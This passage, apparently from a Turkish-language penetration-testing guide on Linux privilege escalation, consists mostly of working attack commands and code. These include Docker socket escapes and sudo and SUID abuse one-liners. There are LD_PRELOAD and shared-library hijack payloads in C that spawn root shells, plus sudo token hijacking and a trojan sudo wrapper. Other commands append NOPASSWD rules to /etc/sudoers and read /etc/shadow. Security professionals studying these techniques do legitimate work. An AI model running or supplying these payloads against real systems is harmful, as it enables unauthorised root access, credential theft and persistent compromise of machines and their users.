docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, host'un dosya sistemine root düzeyinde erişimle bir container çalıştırmanıza izin verir.

#### **Docker API'sini Doğrudan Kullanma**

Docker CLI mevcut değilse, Docker socket hala Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **List Docker Images:** Kullanılabilir Docker images listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Ana sistemin kök dizinini mount eden bir container oluşturmak için istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Container'a bağlantı kurmak için `socat` kullanın; bu, içinde komut çalıştırmayı sağlar.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

socat bağlantısını kurduktan sonra, host'un dosya sistemine root düzeyinde erişimle container içinde doğrudan komut çalıştırabilirsiniz.

### Diğerleri

Unutmayın, eğer docker socket üzerinde yazma izinleriniz varsa çünkü **`docker` grubunun içindeyseniz** [**yetki yükseltmek için daha fazla yolunuz**](interesting-groups-linux-pe/index.html#docker-group) vardır. Eğer [**docker API bir portta dinliyorsa**](../../network-services-pentesting/2375-pentesting-docker.md#compromising) onu da ele geçirebilirsiniz.

docker'dan çıkmak veya onu yetki yükseltmek için kötüye kullanmak üzerine **daha fazla yol** için bakın:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Eğer **`ctr`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Eğer **`runc`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli bir şekilde etkileşim kurmasını ve veri paylaşmasını sağlayan gelişmiş bir **inter-Process Communication (IPC) sistemi**dir. Modern Linux sistemi dikkate alınarak tasarlanmış olup, uygulamalar arasındaki iletişimin farklı biçimleri için sağlam bir çerçeve sunar.

Sistem çok yönlüdür; işlemler arasında veri alışverişini geliştiren temel IPC'yi destekler ve bu, **enhanced UNIX domain sockets**'u andırır. Ayrıca olayları veya sinyalleri yayınlamaya yardımcı olur, sistem bileşenleri arasında sorunsuz entegrasyonu teşvik eder. Örneğin, bir Bluetooth daemon'undan gelen gelen arama bildirimi bir müzik oynatıcıyı sessize aldırabilir; bu, kullanıcı deneyimini iyileştirir. Ek olarak, D-Bus uzak nesne sistemini destekler; bu da uygulamalar arasında servis taleplerini ve yöntem çağrılarını basitleştirerek geleneksel olarak karmaşık olan süreçleri düzene sokar.

D-Bus, eşleşen politika kurallarının kümülatif etkisine dayalı olarak mesaj izinlerini (yöntem çağrıları, sinyal yayımı vb.) yöneten bir **allow/deny model** ile çalışır. Bu politikalar bus ile etkileşimleri belirler ve bu izinlerin kötüye kullanımı yoluyla privilege escalation'a olanak tanıyabilir.

Böyle bir politikanın `/etc/dbus-1/system.d/wpa_supplicant.conf` içindeki bir örneği verilmiştir; root kullanıcısının `fi.w1.wpa_supplicant1` üzerinde sahiplik, gönderme ve alma izinlerini detaylandırır.

Belirli bir kullanıcı veya grup belirtilmeyen politikalar evrensel olarak uygulanır; "default" bağlamındaki politikalar ise diğer özel politikalar tarafından kapsanmayan tüm kullanıcılar için uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Burada bir D-Bus iletişimini enumerate etmeyi ve exploit etmeyi öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate etmek ve makinenin konumunu tespit etmek her zaman ilginçtir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Açık portlar

Erişim sağladıktan sonra, daha önce etkileşim kuramadığınız makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sniff traffic yapıp yapamayacağınızı kontrol edin. Yapabiliyorsanız, bazı credentials ele geçirebilirsiniz.
```
timeout 1 tcpdump
```
## Kullanıcılar

### Genel Keşif

Kontrol edin **kim** olduğunuzu, hangi **ayrıcalıklara** sahip olduğunuzu, sistemde hangi **kullanıcıların** bulunduğunu, hangilerinin **giriş** yapabildiğini ve hangilerinin **root ayrıcalıklarına** sahip olduğunu:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Bazı Linux sürümleri, kullanıcıların **UID > INT_MAX** ile ayrıcalık yükseltmesine izin veren bir hatadan etkilenmişti. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**İstismar etmek için kullanın:** **`systemd-run -t /bin/bash`**

### Groups

Size root ayrıcalıkları verebilecek herhangi bir grubun **üyesi olup olmadığınızı** kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Pano

Eğer mümkünse panoda ilginç bir şey olup olmadığını kontrol edin.
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Eğer ortamın herhangi bir parolasını **biliyorsanız**, parolayı kullanarak **her kullanıcı olarak oturum açmayı deneyin**.

### Su Brute

Eğer çok gürültü çıkarmayı umursamıyorsanız ve `su` ve `timeout` ikili dosyaları bilgisayarda mevcutsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıları brute-force etmeyi deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresi ile de kullanıcıları brute-force etmeye çalışır.

## Yazılabilir PATH kötüye kullanımları

### $PATH

Eğer **$PATH içindeki herhangi bir klasöre yazabiliyorsanız**, farklı bir kullanıcı (tercihen root) tarafından çalıştırılacak bir komutun adıyla **yazılabilir klasörün içine bir backdoor oluşturarak** ayrıcalıkları yükseltebilirsiniz ve bu komut **$PATH'te yazılabilir klasörünüzden önce yer alan bir klasörden yüklenmiyorsa**.

### SUDO and SUID

sudo kullanarak bazı komutları çalıştırmanıza izin verilebilir veya bazı ikili dosyaların suid biti setli olabilir. Bunu şu şekilde kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmeyen komutlar dosya okumanıza ve/veya yazmanıza hatta bir komut çalıştırmanıza izin verir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının parola bilmeden başka bir kullanıcının ayrıcalıklarıyla bazı komutları çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte `demo` kullanıcısı `vim`'i `root` olarak çalıştırabiliyor, artık `root` dizinine bir ssh key ekleyerek veya `sh` çağırarak bir shell almak çok kolay.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge kullanıcının bir şey yürütürken **bir ortam değişkeni ayarlamasına** izin verir:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB machine Admirer'e dayalı**, script root olarak çalıştırılırken rastgele bir python kütüphanesini yüklemek için **PYTHONPATH hijacking**'e **vulnerable** idi:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep ile korunursa → root shell

Eğer sudoers `BASH_ENV`'i korursa (ör. `Defaults env_keep+="ENV BASH_ENV"`), Bash’in etkileşimsiz başlatma davranışını kullanarak izin verilen bir komut çağrıldığında rastgele kodu root olarak çalıştırabilirsiniz.

- Neden işe yarar: Etkileşimsiz kabuklar için, Bash `$BASH_ENV`'i değerlendirir ve hedef betiği çalıştırmadan önce o dosyayı source eder. Birçok sudo kuralı bir betiği veya bir shell wrapper'ını çalıştırmaya izin verir. `BASH_ENV` sudo tarafından korunuyorsa, dosyanız root ayrıcalıklarıyla source edilir.

- Gereksinimler:
- Çalıştırabileceğiniz bir sudo kuralı (etkileşimsiz olarak `/bin/bash`'i çağıran herhangi bir hedef veya herhangi bir bash betiği).
- `BASH_ENV`'in `env_keep` içinde olması (`sudo -l` ile kontrol edin).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Güçlendirme:
- env_keep'ten `BASH_ENV` (ve `ENV`) öğesini kaldırın, `env_reset` tercih edin.
- sudo ile izin verilen komutlar için shell wrapper'larından kaçının; minimal binaries kullanın.
- Korumalı env değişkenleri kullanıldığında sudo I/O logging ve uyarı mekanizmalarını değerlendirin.

### HOME korunmuş olarak sudo üzerinden Terraform (!env_reset)

Eğer sudo ortamı olduğu gibi bırakır (`!env_reset`) ve `terraform apply` çalıştırılmasına izin veriyorsa, `$HOME` çağıran kullanıcıya ait kalır. Bu yüzden Terraform root olarak **$HOME/.terraformrc** dosyasını yükler ve `provider_installation.dev_overrides` ayarını dikkate alır.

- Gerekli provider'ı yazılabilir bir dizine yönlendirin ve provider adını taşıyan kötü amaçlı bir plugin bırakın (ör. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform Go plugin handshake'ını başarısız kılar, ancak payload'ı root olarak çalıştırıp ölmeden önce bir SUID shell bırakır.

### TF_VAR overrides + symlink validation bypass

Terraform variables `TF_VAR_<name>` environment variables aracılığıyla sağlanabilir; sudo ortamı koruduğunda bunlar korunur. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` gibi zayıf doğrulamalar symlinks ile atlatılabilir:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform sembolik bağlantıyı çözer ve gerçek `/root/root.txt` dosyasını attacker-readable bir hedefe kopyalar. Aynı yaklaşım, hedef sembolik bağlantıları önceden oluşturarak (ör. sağlayıcının hedef yolunu `/etc/cron.d/` içine işaret ederek) ayrıcalıklı yollara **yazma** için kullanılabilir.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Eğer `sudo -l` `env_keep+=PATH` gösteriyorsa veya attacker-writable girdiler içeren bir `secure_path` (ör. `/home/<user>/bin`) varsa, sudo tarafından izin verilen hedef içindeki mutlak yol kullanılmadan çağrılan herhangi bir komut gölgelenebilir.

- Gereksinimler: mutlak yol içermeyen komutları (`free`, `df`, `ps`, vb.) çağıran bir script/binary çalıştıran bir sudo kuralı (çoğunlukla `NOPASSWD`) ve ilk aranan yazılabilir bir PATH girdisi.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo yürütme atlatma yolları
**Atlayarak** diğer dosyaları okuyun veya **symlinks** kullanın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** kullanılıyorsa (\*), bu daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary komut yolu olmadan

Eğer **sudo permission** tek bir komuta **komut yolu belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ PATH değişkenini değiştirerek bundan faydalanabilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, eğer bir **suid** binary **yolunu belirtmeden başka bir komut çalıştırıyorsa (her zaman _**strings**_ ile garip bir SUID binary'nin içeriğini kontrol edin)** kullanılabilir.

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu olan SUID binary

Eğer **suid** binary **komutun yolunu belirterek başka bir komut çalıştırıyorsa**, o zaman suid dosyasının çağırdığı komut adıyla bir **export a function** oluşturmayı deneyebilirsiniz.

Örneğin, eğer bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, fonksiyonu oluşturup export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonra, suid binary'i çağırdığınızda, bu fonksiyon çalıştırılacaktır

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

Ancak, sistem güvenliğini sağlamak ve özellikle **suid/sgid** yürütülebilir dosyalarının bu özellik tarafından suistimal edilmesini önlemek için, sistem bazı koşullar uygular:

- Yükleyici, gerçek kullanıcı kimliği (_ruid_) etkin kullanıcı kimliği (_euid_) ile eşleşmeyen yürütülebilir dosyalar için **LD_PRELOAD**'u yok sayar.
- **suid/sgid** olan yürütülebilir dosyalar için, yalnızca standart yollarda bulunan ve aynı zamanda **suid/sgid** olan kütüphaneler ön yüklenir.

Yetki yükseltmesi, `sudo` ile komut çalıştırma yeteneğiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa meydana gelebilir. Bu yapılandırma, komutlar `sudo` ile çalıştırılsa bile **LD_PRELOAD** ortam değişkeninin korunmasına ve tanınmasına izin verir; bu da potansiyel olarak yükseltilmiş ayrıcalıklarla herhangi bir kodun çalıştırılmasına yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
Şu adıyla kaydedin: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Sonra **onu derleyin** şu komutla:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırarak
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** ortam değişkenini kontrol ediyorsa kötüye kullanılabilir çünkü kütüphanelerin aranacağı yolu o kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Olağandışı görünen bir **SUID** iznine sahip binary ile karşılaşıldığında, **.so** dosyalarını doğru şekilde yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komutu çalıştırarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata ile karşılaşmak, exploitation için bir potansiyel olduğunu gösterir.

Bunu exploit etmek için, _"/path/to/.config/libcalc.c"_ gibi bir C dosyası oluşturulur ve aşağıdaki kodu içerir:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlenip çalıştırıldığında dosya izinlerini manipüle ederek ve yükseltilmiş privileges ile bir shell çalıştırarak privileges yükseltmeyi amaçlar.

Yukarıdaki C dosyasını bir shared object (.so) dosyasına şu komutla derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary çalıştırıldığında istismar tetiklenmeli ve potansiyel olarak sistemin ele geçirilmesine izin vermelidir.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Yazabileceğimiz bir klasörden library yükleyen bir SUID binary bulduğumuza göre, gerekli isimle bu klasöre kütüphaneyi oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Aşağıdaki gibi bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyona sahip olması gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix ikili dosyalarının saldırgan tarafından yerel güvenlik kısıtlamalarını aşmak için suistimal edilebileceği, küratörlüğü yapılmış bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) ise aynı şeyi, bir komuta **sadece argüman enjekte edebildiğiniz** durumlar için sunar.

Proje, kısıtlı shell'lerden kaçmak, ayrıcalıkları yükseltmek veya korumak, dosya transferi yapmak, bind ve reverse shell'ler oluşturmak ve diğer post-exploitation görevlerini kolaylaştırmak için kötüye kullanılabilecek Unix ikili dosyalarının meşru fonksiyonlarını toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l`'ye erişebiliyorsanız, herhangi bir sudo kuralını nasıl suistimal edebileceğini bulup bulmadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Reusing Sudo Tokens

Parolanız olmasa da **sudo access**'iniz varsa, ayrıcalıkları yükseltmek için bir sudo komutunun çalıştırılmasını bekleyip ardından oturum token'ını kaçırarak yükseltebilirsiniz.

Ayrıcalıkları yükseltmek için gereksinimler:

- Zaten `_sampleuser_` kullanıcısı olarak bir shell'e sahip olmalısınız
- `_sampleuser_` son 15 dakika içinde bir şey yürütmek için **`sudo` kullanmış olmalı** (varsayılan olarak bu, parola girmeksizin `sudo` kullanmamıza izin veren sudo token'ının süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` değeri 0 olmalı
- `gdb` erişilebilir olmalı (onu yükleyebilmelisiniz)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` olarak ayarlayabilirsiniz)

Eğer tüm bu gereksinimler karşılanmışsa, **ayrıcalıkları şu aracı kullanarak yükseltebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **ikinci exploit** (`exploit_v2.sh`) _/tmp_ içinde bir sh shell oluşturacak **root sahipliğinde, setuid ile**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Bu **üçüncü exploit** (`exploit_v3.sh`) **bir sudoers file oluşturacak**; bu **sudo token'larını kalıcı hale getirir ve tüm kullanıcıların sudo kullanmasına izin verir**.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Klasörde veya klasör içindeki herhangi bir oluşturulan dosyada **write permissions**'a sahipseniz, ikili [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ile **create a sudo token for a user and PID** kullanabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını overwrite edebiliyor ve PID 1234 olan o kullanıcı olarak bir shell'e sahipseniz, şifreyi bilmenize gerek kalmadan şu şekilde **obtain sudo privileges** elde edebilirsiniz:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` dosyası ve `/etc/sudoers.d` içindeki dosyalar kimin `sudo` kullanabileceğini ve nasıl kullanacağını yapılandırır. Bu dosyalar **varsayılan olarak yalnızca kullanıcı root ve grup root tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı ilginç bilgiler **elde edebilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** **escalate privileges** yapabilirsiniz.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazabiliyorsanız bu izni kötüye kullanabilirsiniz.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın bir diğer yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD için `doas` gibi `sudo` ikili dosyasına bazı alternatifler vardır; yapılandırmasını `/etc/doas.conf`'da kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcının genellikle bir makineye bağlanıp ayrıcalıkları yükseltmek için `sudo` kullandığını** ve o kullanıcı bağlamında bir shell elde ettiğinizi biliyorsanız, root olarak kodunuzu çalıştıracak ve ardından kullanıcının komutunu çalıştıracak yeni bir sudo yürütülebilir dosyası oluşturabilirsiniz. Sonra, kullanıcı bağlamının $PATH'ini (örneğin yeni yolu .bash_profile içine ekleyerek) değiştirin; böylece kullanıcı sudo'yu çalıştırdığında sizin sudo yürütülebilir dosyanız çalıştırılır.

Dikkat edin: eğer kullanıcı farklı bir shell (bash değil) kullanıyorsa yeni yolu eklemek için diğer dosyaları değiştirmeniz gerekecektir. Örneğin[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Ya da şu gibi bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

Dosya `/etc/ld.so.conf` yüklenecek yapılandırma dosyalarının **bulunduğu yerleri** gösterir. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları **kütüphanelerin** **aranacağı** **diğer klasörlere işaret eder**. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib`'tir. **Bu, sistemin kütüphaneleri `/usr/local/lib` içinde arayacağı anlamına gelir**.

Eğer herhangi bir nedenle **bir kullanıcı yazma izinlerine sahipse** belirtilen yollardan herhangi biri üzerinde: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasının işaret ettiği herhangi bir klasör, ayrıcalıkları yükseltebilir.\  
Aşağıdaki sayfada bu yanlış yapılandırmanın **nasıl istismar edileceğine** bakın:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib'i `/var/tmp/flag15/` dizinine kopyalayarak, `RPATH` değişkeninde belirtildiği gibi program tarafından bu konumda kullanılacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Sonra `/var/tmp` dizininde `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` ile kötü amaçlı bir kütüphane oluşturun.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux capabilities, bir sürece mevcut root ayrıcalıklarının **bir alt kümesini sağlar**. Bu, root ayrıcalıklarını **daha küçük ve ayrı birimlere böler**. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Bu şekilde ayrıcalıkların tam kümesi azaltılır ve istismar riskleri düşer.\
Aşağıdaki sayfayı okuyarak **capabilities hakkında ve bunlardan nasıl faydalanılacağı hakkında daha fazla bilgi edinebilirsiniz**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **"execute" biti**, etkilenen kullanıcının "**cd**" ile klasöre girebileceği anlamına gelir.\
**"read"** biti kullanıcının **dosyaları listeleyebileceğini**, ve **"write"** biti kullanıcının **dosyaları silebileceğini** ve yeni **dosyalar oluşturabileceğini** ifade eder.

## ACLs

